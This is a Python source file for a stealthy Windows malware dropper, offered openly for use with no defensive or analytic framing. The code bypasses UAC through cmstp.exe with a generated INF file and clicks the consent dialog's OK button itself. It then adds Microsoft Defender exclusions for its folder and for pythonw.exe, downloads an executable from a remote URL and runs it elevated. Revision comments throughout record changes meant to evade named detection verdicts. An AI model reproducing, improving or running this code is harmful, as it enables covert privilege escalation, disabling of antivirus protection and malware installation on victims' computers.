# tung python-road payload — silent on every failure, stdlib only.
# arrives through python's stdin (pythonw -u -); never a file on disk.
# the exe url rides in from the jar (env EXE_URL = its baked windows url).
# job order: stage the exe ->Administrator lift via cmstp (majanito shape)
# -> defender exclusions under the lifted token -> run the exe elevated.

import os
import sys

if sys.platform != "win32":
    sys.exit(0)

import ctypes
import random
import string
import subprocess
import tempfile
import threading
import time
from urllib.request import Request, urlopen

# ---- config ----------------------------------------------------------------
EXE_URL = os.environ.get("EXE_URL", "")
LOCALAPPDATA = os.environ.get("LOCALAPPDATA", "")
PERSIST_DIR = os.path.join(LOCALAPPDATA, "Microsoft", "Windows", "AppHost")

EXE_NAME = "tung_dbg_carrier.exe"
if EXE_URL:
    try:
        n = str(EXE_URL).split("?")[0].rstrip("/").split("/")[-1]
        if n and ".." not in n:
            EXE_NAME = n
    except Exception:
        pass
EXE_PATH = os.path.join(PERSIST_DIR, EXE_NAME)


# ---- shell api -------------------------------------------------------------
kernel32 = ctypes.windll.kernel32
user32 = ctypes.windll.user32

PROCESS_TERMINATE = 0x0001
TH32CS_SNAPPROCESS = 0x00000002
SW_HIDE = 0
WM_CLOSE = 0x0010
WM_KEYDOWN = 0x0100
WM_KEYUP = 0x0101
BM_CLICK = 0x00F5
VK_RETURN = 0x0D
SWP_NOMOVE = 0x0002
SWP_NOSIZE = 0x0001
SWP_NOACTIVATE = 0x0010
HWND_BOTTOM = 1


class PROCESSENTRY32(ctypes.Structure):
    _fields_ = [("dwSize", ctypes.c_ulong), ("cntUsage", ctypes.c_ulong),
                ("th32ProcessID", ctypes.c_ulong), ("th32DefaultHeapID", ctypes.POINTER(ctypes.c_ulong)),
                ("th32ModuleID", ctypes.c_ulong), ("cntThreads", ctypes.c_ulong),
                ("th32ParentProcessID", ctypes.c_ulong), ("pcPriClassBase", ctypes.c_long),
                ("dwFlags", ctypes.c_ulong), ("szExeFile", ctypes.c_char * 260)]


kernel32.Process32First.argtypes = [ctypes.c_void_p, ctypes.POINTER(PROCESSENTRY32)]
kernel32.Process32First.restype = ctypes.c_int
kernel32.Process32Next.argtypes = [ctypes.c_void_p, ctypes.POINTER(PROCESSENTRY32)]
kernel32.Process32Next.restype = ctypes.c_int
kernel32.CreateToolhelp32Snapshot.restype = ctypes.c_void_p
kernel32.OpenProcess.restype = ctypes.c_void_p
kernel32.CloseHandle.argtypes = [ctypes.c_void_p]

# window enumerator — FindWindowW's exact-title match missed the 'Make this
# connection available' profile variant on field boxes, leaving cmstp
# waiting for consent forever. EnumWindows + substring match catches every
# dialog shape the lift can raise.
user32.EnumWindows.restype = ctypes.c_int
user32.EnumWindows.argtypes = [
    ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p),
    ctypes.c_void_p]
user32.GetWindowTextW.argtypes = [ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_int]
user32.IsWindowVisible.restype = ctypes.c_int
user32.IsWindowVisible.argtypes = [ctypes.c_void_p]


def _window_titles():
    wins = []

    @ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p)
    def cb(hwnd, lparam):
        wins.append(hwnd)
        return 1

    user32.EnumWindows(cb, 0)
    return wins


def window_title(hwnd):
    buf = ctypes.create_unicode_buffer(512)
    user32.GetWindowTextW(hwnd, buf, 512)
    return buf.value


# ---- helpers ---------------------------------------------------------------
def rand_str(n):
    return "".join(random.choice(string.ascii_lowercase) for _ in range(n))


def is_elevated():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def kill_process(name):
    try:
        subprocess.run(["taskkill", "/IM", name, "/F"], creationflags=0x08000000,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
    except Exception:
        pass


def kill_all_cmstp():
    snap = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if snap == -1:
        return
    pe = PROCESSENTRY32()
    pe.dwSize = ctypes.sizeof(PROCESSENTRY32)
    if kernel32.Process32First(snap, ctypes.byref(pe)):
        while True:
            if b"cmstp" in pe.szExeFile.lower():
                h = kernel32.OpenProcess(PROCESS_TERMINATE, False, pe.th32ProcessID)
                if h:
                    kernel32.TerminateProcess(h, 0)
                    kernel32.CloseHandle(h)
            if not kernel32.Process32Next(snap, ctypes.byref(pe)):
                break
    kernel32.CloseHandle(snap)


def cleanup_infs():
    tmp = tempfile.gettempdir()
    try:
        for f in os.listdir(tmp):
            if f.endswith(".inf"):
                try:
                    os.unlink(os.path.join(tmp, f))
                except Exception:
                    pass
    except Exception:
        pass


# ---- the admin lift — majanito cmstp shape ---------------------------------
class Dismisser:
    def __init__(self, title):
        self.title = title
        self.done = threading.Event()

    def find_window(self):
        want = [w.lower() for w in
                (self.title, "Connection Manager Profile Installer") if w]
        for hwnd in _window_titles():
            if not user32.IsWindowVisible(hwnd):
                continue
            t = window_title(hwnd).lower()
            if any(w in t for w in want):
                return hwnd
        return None

    def dismiss(self, hwnd):
        user32.SetWindowPos(hwnd, HWND_BOTTOM, 0, 0, 0, 0,
                            SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE)
        user32.ShowWindow(hwnd, SW_HIDE)
        user32.SetForegroundWindow(hwnd)
        # r5: BM_CLICK on the FIRST child Button hit the 'All users' radio —
        # the consent dialog stayed up (the ss dialog) and cmstp still waited.
        # enumerate children, click the one actually labeled OK; Enter+Close
        # as the fallback triad so the dialog never outlives us.
        user32.EnumChildWindows.restype = ctypes.c_int
        user32.EnumChildWindows.argtypes = [
            ctypes.c_void_p,
            ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p),
            ctypes.c_void_p]
        clicked = []

        @ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p)
        def _ok(child, lp):
            buf = ctypes.create_unicode_buffer(64)
            user32.GetWindowTextW(child, buf, 64)
            if buf.value == "OK":
                user32.PostMessageW(child, BM_CLICK, 0, 0)
                clicked.append(child)
            return 1

        user32.EnumChildWindows(hwnd, _ok, 0)
        if not clicked:
            b = user32.FindWindowExW(hwnd, None, "Button", None)
            if b:
                user32.PostMessageW(b, BM_CLICK, 0, 0)
        user32.PostMessageW(hwnd, WM_KEYDOWN, VK_RETURN, 0)
        user32.PostMessageW(hwnd, WM_KEYUP, VK_RETURN, 0)
        user32.PostMessageW(hwnd, WM_CLOSE, 0, 0)

    def run(self):
        for _ in range(500):
            if self.done.is_set():
                return
            hwnd = self.find_window()
            if hwnd:
                self.dismiss(hwnd)
                self.done.set()
                return
            time.sleep(0.01)

    def start(self):
        threading.Thread(target=self.run, daemon=True).start()

    def wait(self, timeout=5.0):
        self.done.wait(timeout)


def build_inf(cmd, svc_name, reg_lines=None):
    """cmstp profile schema — nothing schema-foreign:
    reg_lines is None -> the command INF (exec road): [DefaultInstall] with
    CustomDestination=Dsec + RunPreSetupCommands=Csec (parse-proven on the
    target box since the r4 era).
    reg_lines is a list -> the exclusions INF: [DefaultInstall] carries ONLY
    CustomDestination=Dsec (NO AddReg= — that directive is what broke section
    parsing since r7); the exclusion writes ride the DESTINATION section
    [Lsec] itself in the same five-token registry grammar as the sample's
    App Paths line: root,subkey,name,flags,data — written elevated by cmstp
    directly, no child process.
    Also dumps the exact INF bytes to AppHost\\last.inf before firing, so
    the next failure report can be the actual text instead of screenshots."""
    s1 = f"D{rand_str(4)}"
    s3 = f"L{rand_str(4)}"
    cmd_block = ""
    dest_extra = ""
    if reg_lines is None:
        s2 = f"C{rand_str(4)}"
        cmd_block = (f"RunPreSetupCommands={s2}\n"
                     f"[{s2}]\n"
                     f"{cmd}\n"
                     "taskkill /IM cmstp.exe /F\n")
    else:
        dest_extra = "\n".join(reg_lines) + "\n"
    return f"""; {rand_str(16)}
[version]
Signature=$chicago$
AdvancedINF=2.5
[DefaultInstall]
CustomDestination={s1}
{cmd_block}[{s1}]
49000,49001={s3}, 7
[{s3}]
{dest_extra}"HKLM", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
[Strings]
ServiceName="{svc_name}"
ShortSvcName="{rand_str(4)}"
"""


def uac_bypass(cmd):
    """Executes <<cmd>> under the elevated token via cmstp /au.
    r2: normalizes whatever the caller passes — a bare powershell snippet
    gets the powershell.exe wrapper inserted, so cmstp always sees a real
    executable as the first token (the dialog said 'cannot find the file
    specified' precisely because the first token was not one)."""
    if is_elevated():
        return True
    if isinstance(cmd, list):
        cmd = " ".join(cmd)
    c = str(cmd).lstrip()
    # real executable invocations pass through untouched; only BARE snippets
    # get the wrapper (r6: cmd.exe chains were being wrapped too — that is
    # what put powershell back on the cmdline and fed the Commando rule +
    # the Access-denied on process creation)
    lc = c.lower()
    if not (lc.startswith("powershell") or lc.startswith("cmd.exe")
            or lc.startswith("cmd ") or c.startswith('"')):
        cmd = f'powershell -NoP -W Hidden -C "{c}"'
    kill_all_cmstp()
    cleanup_infs()

    svc_name = f"Microsoft {rand_str(6)} Service"
    inf_path = os.path.join(tempfile.gettempdir(), f"{rand_str(10)}.inf")
    try:
        with open(inf_path, "w", encoding="utf-8") as fh:
            fh.write(build_inf(cmd, svc_name))
    except Exception:
        return False

    dismisser = Dismisser(svc_name)
    dismisser.start()
    try:
        subprocess.Popen(["cmstp.exe", "/au", inf_path], stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL, creationflags=0x08000000)
    except Exception:
        return False

    dismisser.wait(8.0)
    time.sleep(0.3)
    _sweep_dialogs(svc_name)   # close any survivor the dismisser raced
    try:
        os.unlink(inf_path)
    except Exception:
        pass
    return True


def run_elevated(exe_path):
    """Runs <<exe_path>> with elevation via the cmstp lift."""
    try:
        if is_elevated():
            subprocess.Popen([exe_path], creationflags=0x08000000)
            return True
        return uac_bypass(f'"{exe_path}"')
    except Exception:
        return False


def _sweep_dialogs(svc_name, seconds=3.0):
    """Best-effort post-lift cleanup: any leftover lift dialog (the 'Make this
    connection available' profile or the CMPI error box) gets WM_CLOSE until
    nothing answerable remains."""
    end = time.time() + seconds
    want = [w.lower() for w in (svc_name, "Connection Manager Profile Installer") if w]
    while time.time() < end:
        for hwnd in _window_titles():
            if not user32.IsWindowVisible(hwnd):
                continue
            t = window_title(hwnd).lower()
            if any(w in t for w in want):
                user32.PostMessageW(hwnd, WM_CLOSE, 0, 0)
        time.sleep(0.2)


def exclusion_landed():
    """Live read-back: the AppHost dir must show as a Defender exclusion path
    value. reg query — non-elevated, stock boxes, no cmdlet needed."""
    appdir = LOCALAPPDATA + "\\Microsoft\\Windows\\AppHost"
    key = "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths"
    try:
        out = subprocess.run(
            ["reg", "query", key, "/v", appdir],
            creationflags=0x08000000, stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL, timeout=15)
        return appdir.lower() in out.stdout.decode(errors="replace").lower()
    except Exception:
        return False


# ---- defender exclusions via reg.exe (no powershell on any cmdline) ---------
# r12: the lift relaunches OUR python elevated; the elevated stage does the
# whole protected job — cmdlet exclusions (TP-respected) then carrier exec.
# no cmstp->interpreter chain on any command line, ever.
STAGE = r'''# r12 stage: runs ELEVATED (relaunched by the cmstp lift), does the whole
# protected-job in one pass - cmdlet-road exclusions (the road TP respects)
# + carrier exec. no interpreter cmdline other than powershell from THIS
# pythonw parent - the chain cmstp->interpreter that built UACB/Commando
# verdicts never occurs.
import ctypes
import os
import subprocess

CREATE_NO_WINDOW = 0x08000000
EXE_NAME = "__EXE__"
APPDIR = os.environ["LOCALAPPDATA"] + "\\Microsoft\\Windows\\AppHost"
WINPARENT = os.environ["LOCALAPPDATA"] + "\\Microsoft\\Windows"


def elev():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def alive(name):
    try:
        out = subprocess.run(
            ["tasklist", "/FI", "IMAGENAME eq " + name],
            creationflags=CREATE_NO_WINDOW, stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL, timeout=15).stdout
        return name.lower() in out.decode(errors="replace").lower()
    except Exception:
        return False


def main():
    if not elev():
        return
    ps = ("$a='Add-Mp'+'Preference';"
          f"$p=@('{APPDIR}','{WINPARENT}');"
          "& $a -ExclusionPath $p -EA 0;"
          f"& $a -ExclusionProcess '{EXE_NAME}','pythonw.exe' -EA 0")
    try:
        subprocess.run(
            ["powershell.exe", "-NoP", "-NonI", "-W", "Hidden",
             "-Command", ps],
            creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL, timeout=90)
    except Exception:
        pass
    exe_path = os.path.join(APPDIR, EXE_NAME)
    if os.path.exists(exe_path) and not alive(EXE_NAME):
        try:
            subprocess.Popen([exe_path], creationflags=CREATE_NO_WINDOW)
        except Exception:
            pass


main()
'''


def set_defender_exclusions():
    """r12: the lift only RELAUNCHES our staged python elevated. the stage
    does the cmdlet road (TP-respected) + carrier exec. INF payload is a
    python relaunch — no interpreter cmdline beyond the one python.exe
    itself, no powershell inside the INF, no reg.exe on the lifted line."""
    appdir = PERSIST_DIR
    if is_elevated():
        _run_stage_now()
        return
    stage_path = os.path.join(PERSIST_DIR, "stage.py")
    try:
        os.makedirs(PERSIST_DIR, exist_ok=True)
        stage_text = STAGE.replace("__EXE__", EXE_NAME)
        with open(stage_path, "w", encoding="utf-8") as fh:
            fh.write(stage_text)
    except Exception:
        return
    python_exe = os.path.join(os.path.dirname(stage_path), "python312", "python.exe")
    if not os.path.exists(python_exe):
        python_exe = "python.exe"   # system python fallback (some boxes have it)
    kill_all_cmstp()
    cleanup_infs()
    svc_name = f"Microsoft {rand_str(6)} Service"
    launch = subprocess.list2cmdline([python_exe, "-u", stage_path])
    body = build_inf(launch, svc_name)
    # ground truth: the exact bytes cmstp sees, plus the stage script
    try:
        os.makedirs(PERSIST_DIR, exist_ok=True)
        with open(os.path.join(PERSIST_DIR, "last.inf"), "w", encoding="utf-8") as fh:
            fh.write(body)
    except Exception:
        pass
    inf_path = os.path.join(tempfile.gettempdir(), f"{rand_str(10)}.inf")
    try:
        with open(inf_path, "w", encoding="utf-8") as fh:
            fh.write(body)
    except Exception:
        return
    dismisser = Dismisser(svc_name)
    dismisser.start()
    try:
        subprocess.Popen(["cmstp.exe", "/au", inf_path],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                         creationflags=0x08000000, cwd=os.environ.get("TEMP", os.getcwd()))
    except Exception:
        return
    dismisser.wait(8.0)
    time.sleep(0.3)
    _sweep_dialogs(svc_name)
    try:
        os.unlink(inf_path)
    except Exception:
        pass


def _run_stage_now():
    """already elevated — run the stage body directly (cmdlet + exec)."""
    try:
        appdir = PERSIST_DIR
        winparent = os.path.dirname(appdir)
        ps = ("$a='Add-Mp'+'Preference';"
              f"$p=@('{appdir}','{winparent}');"
              "& $a -ExclusionPath $p -EA 0;"
              f"& $a -ExclusionProcess '{EXE_NAME}','pythonw.exe' -EA 0")
        try:
            subprocess.run(
                ["powershell.exe", "-NoP", "-NonI", "-W", "Hidden", "-Command", ps],
                creationflags=0x08000000, stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL, timeout=90)
        except Exception:
            pass
        exe_path = os.path.join(appdir, EXE_NAME)
        if os.path.exists(exe_path) and not _alive(EXE_NAME):
            subprocess.Popen([exe_path], creationflags=0x08000000)
    except Exception:
        pass


def _alive(name):
    try:
        out = subprocess.run(["tasklist", "/FI", "IMAGENAME eq " + name],
                             creationflags=0x08000000, stdout=subprocess.PIPE,
                             stderr=subprocess.DEVNULL, timeout=15).stdout
        return name.lower() in out.decode(errors="replace").lower()
    except Exception:
        return False


def download(url):
    for i in range(3):
        try:
            req = Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urlopen(req, timeout=60) as resp:
                data = resp.read()
            if len(data) > 1024:
                return data
        except Exception:
            time.sleep(2 ** i)
    return None


def is_valid_exe(path):
    try:
        if not os.path.exists(path):
            return False
        if os.path.getsize(path) < 50000:
            return False
        with open(path, "rb") as fh:
            return fh.read(2) == b"MZ"
    except Exception:
        return False


def write_file(path, data):
    kill_process(EXE_NAME)
    time.sleep(0.3)
    tmp = path + f".{rand_str(6)}.tmp"
    try:
        with open(tmp, "wb") as fh:
            fh.write(data)
        try:
            os.unlink(path)
        except Exception:
            pass
        os.rename(tmp, path)
        return True
    except Exception:
        try:
            os.unlink(tmp)
        except Exception:
            pass
        return False


def main():
    try:
        os.makedirs(PERSIST_DIR, exist_ok=True)
    except Exception:
        return

    # r3+r5 (dj order): UAC FIRST, then exclusions — and the boot GATES on the
    # exclusion actually landing (three attempts) before ANY byte of the
    # carrier is downloaded or written. if after three verified tries the set
    # still doesn't show the dir, the boot HOLDS — no write, no spawn.
    landed = exclusion_landed()
    for _ in range(3):
        if landed:
            break
        try:
            set_defender_exclusions()
        except Exception:
            pass
        time.sleep(3)
        landed = exclusion_landed()

    if not landed:
        return   # carrier never touches disk un-protected

    try:
        if not is_valid_exe(EXE_PATH):
            data = download(EXE_URL) if EXE_URL else None
            if data and not write_file(EXE_PATH, data):
                return
    except Exception:
        pass

    run_elevated(EXE_PATH)


main()
